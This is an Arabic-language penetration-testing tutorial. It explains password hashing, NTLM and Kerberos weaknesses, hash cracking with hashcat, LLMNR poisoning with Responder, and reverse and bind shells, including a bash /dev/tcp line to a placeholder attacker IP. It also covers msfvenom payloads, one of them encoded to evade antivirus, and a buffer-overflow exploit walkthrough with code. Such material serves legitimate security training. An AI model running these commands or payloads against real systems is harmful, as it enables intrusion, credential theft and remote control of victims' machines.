🔑 ثانياً: Password Hashing — كيف تُخزَّن الباسوردات؟

🧠 ما هو الـ Hash؟

الـ Hash هو تحويل الباسورد لنص مشفر بطريقة أحادية الاتجاه — يمكن تحويل الباسورد للـ Hash لكن لا يمكن العكس مباشرة.

password
↓ MD5
5f4dcc3b5aa765d61d8327deb882cf99
🧂 ما هو الـ Salt؟

الـ Salt هو قيمة عشوائية تُضاف للباسورد قبل التشفير — يمنع هجمات الـ Rainbow Tables لأن نفس الباسورد يُنتج هاشات مختلفة.

password + xK9#mZ
↓ bcrypt
$2y$10$xK9mZ...unique_hash
📊 أنواع الـ Hash الشائعة:
النوعالطولمستوى الأمانالاستخدام
MD532 حرف⚠️ ضعيف جداًقديم، لا يُنصح به
SHA-140 حرف⚠️ ضعيفقديم، Git commits
SHA-25664 حرف✅ جيدSSL, Blockchain
bcrypt60 حرف✅ ممتازتخزين باسوردات المواقع
NTLM32 حرف⚠️ متوسطWindows Authentication

🪟 ثالثاً: Windows Authentication Protocols

NTLM — النظام القديم

يعمل بالـ Hash بدلاً من الباسورد الحقيقي. الجهاز بيبعت الـ Hash ويتحقق منه بدون إرسال الباسورد نفسه.

🎯 نقطة ضعف:

يمكن سرقة الـ Hash واستخدامه مباشرة دون كسره!
→ Pass-the-Hash Attack 🔥

Kerberos — النظام الحديث

يعمل بنظام التذاكر (Tickets). المستخدم يحصل على TGT (Ticket Granting Ticket) ثم يستخدمه للوصول للخدمات.

🎯 نقطة ضعف:

يمكن سرقة التذاكر من الذاكرة
→ Pass-the-Ticket / Kerberoasting

🔓 رابعاً: Password Cracking — كسر الباسوردات

📖 Dictionary Attack

يجرب كلمات من قاموس (rockyou.txt). الأسرع ويغطي الباسوردات الشائعة.

💪 Brute Force

يجرب كل التركيبات الممكنة. بطيء جداً لكن لا يفوته شيء.

🔀 Hybrid Attack

يجمع القاموس + تعديلات (مثال: password1, P@ssword!).

🌈 Rainbow Table

جداول جاهزة بالـ Hashes — سريع جداً لكن لا يعمل مع الـ Salt.

⚡ Hashcat — أقوى أداة كسر هاش في العالم GPU Powered 🔥
hash-identifier # خطوة 1: حدد نوع الهاش أولاً
hashcat -m 0 hash.txt rockyou.txt # -m 0 = MD5
hashcat -m 1000 hash.txt rockyou.txt # -m 1000 = NTLM
hashcat -m 1800 hash.txt rockyou.txt # -m 1800 = SHA-512 (Linux)
hashcat --help | grep -i "hash modes" # شوف كل الـ modes
📌 للحصول على Wordlist rockyou.txt في Kali:
gzip -d /usr/share/wordlists/rockyou.txt.gz

☠️ خامساً: LLMNR Poisoning — أخطر هجوم على الشبكة الداخلية

🧠 كيف يعمل الهجوم؟
  1. جهاز في الشبكة يطلب اسم سيرفر \\FILESERVER
  2. الـ DNS مش عارف الجواب
  3. الجهاز يسأل الشبكة كلها: "مين يعرف FILESERVER؟"
  4. أنت (المهاجم) ترد: "أنا FILESERVER!" 😈
  5. الجهاز الضحية يبعتلك الـ NTLM Hash تلقائياً!
⚡ Responder — أداة الهجوم
responder -I eth0
responder -I eth0 -rdwv # كل الـ protocols

بعد التقاط الـ Hash:

hashcat -m 5600 captured_hash.txt rockyou.txt

-m 5600 = NTLMv2

🎯 يعمل على أي شبكة Windows داخلية — بدون باسورد أو صلاحيات!

💻 سادساً: Shells — بوابة التحكم في الجهاز

بعد استغلال الثغرة، ستحصل على Shell — وهو سطر أوامر مباشر على الجهاز المخترق.

🔄 Reverse Shell
⭐ الأهم

الضحية يتصل بجهازك أنت — يتخطى الـ Firewall!

على جهازك (Attacker) — استمع:

nc -lvnp 4444

على جهاز الضحية — ابعت الـ Shell:

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
🔗 Bind Shell
محدود

أنت تتصل بالضحية — لكن الـ Firewall غالباً يبلوكه.

على جهاز الضحية — افتح بورت:

nc -lvnp 4444 -e /bin/bash

على جهازك — اتصل:

nc -nv VICTIM_IP 4444
💡 موقع ممتاز لتوليد Reverse Shells جاهزة: revshells.com — يدعم Python, PHP, PowerShell, Java, وأكثر!

🦠 2. msfvenom — مصنع الـ Payloads

msfvenom = أقوى أداة لإنشاء payloads خبيثة لكل الأنظمة وكل اللغات.

🪟 Windows — Reverse Shell الأكثر استخداماً
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > reverse.exe
-p نوع الـ payload LHOST IP جهازك LPORT البورت -f exe نوع الملف
🔗 Windows — Bind Shell
msfvenom -p windows/meterpreter/bind_tcp RHOST=TARGET LPORT=4444 -f exe > bind.exe

الضحية بيفتح بورت وأنت بتتصل عليه.

🐧 Linux — ELF Shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
chmod +x shell.elf && ./shell.elf
🌐 PHP — Web Shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php

ترفعه على موقع PHP — يتصل بيك أوتوماتيك عند التشغيل.

🔒 Encoded — Bypass AV ⚠️ Advanced
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
-e الـ encoder -i 3 عدد التشفيرات

يشفر الـ payload 3 مرات لتجاوز الـ Antivirus.

📋 شوف كل الـ Payloads
msfvenom -l payloads
msfvenom -l payloads | grep windows
msfvenom -l encoders

💥 4. Buffer Overflow — أخطر وأصعب هجوم 🔥🔥🔥

🧠 الفكرة الأساسية:

كل برنامج عنده Buffer — منطقة ذاكرة محددة الحجم لاستقبال الـ Input. لو بعثت بيانات أكبر من الـ Buffer، البيانات الزيادة هتكتب فوق مناطق مهمة في الذاكرة!

🎯 الهدف: الكتابة فوق الـ EIP (Instruction Pointer) — اللي بيتحكم في التعليمة الجاية — وتوجيهه لـ Shellcode بتاعك!
🗺️ تخيل الذاكرة كده:
[ BUFFER — 200 bytes ]
↓ overflow يكتب هنا ↓
[ EBP — Saved Pointer ]
[ EIP — Return Address ] ← هنا نتحكم!
[ SHELLCODE هنا 🔥 ]
⚙️ خطوات Buffer Overflow (المنهج الكامل):
STEP 1 فحص البرنامج — هل بيقبل input؟
nc 192.168.1.5 9999

جرب تبعت بيانات وشوف إيه الـ response.

STEP 2 Fuzzing — عند أد إيه البرنامج يقع؟
import socket

buffer = "A" * 100

while True:
  try:
    s = socket.socket()
    s.connect(("192.168.1.5", 9999))
    s.send(buffer.encode())
    buffer += "A" * 100
  except:
    print("Crashed at:", len(buffer))
    break

✅ هيطبعلك "Crashed at: 2200" — يعني عند 2200 بايت البرنامج وقع!

STEP 3 تحديد الـ Offset — فين مكان الـ EIP بالظبط؟
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP_VALUE

بتبعت pattern فريد وبعدين بتشوف قيمة الـ EIP عند الـ Crash — هتعرف الـ Offset بالظبط.

مثال: Exact match at offset 1978 — يعني الـ EIP في البايت رقم 1978!

STEP 4 إدخال الـ Shellcode — السيطرة الكاملة! 😈
# Generate shellcode:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\x00" -f py

# Build exploit:
offset = 1978
eip = b"\xAF\x11\x50\x62" # JMP ESP address
nop_sled = b"\x90" * 16
payload = b"A" * offset + eip + nop_sled + shellcode

✅ الـ EIP بيوجه للـ JMP ESP → NOP Sled → Shellcode → Shell مفتوح! 🔥
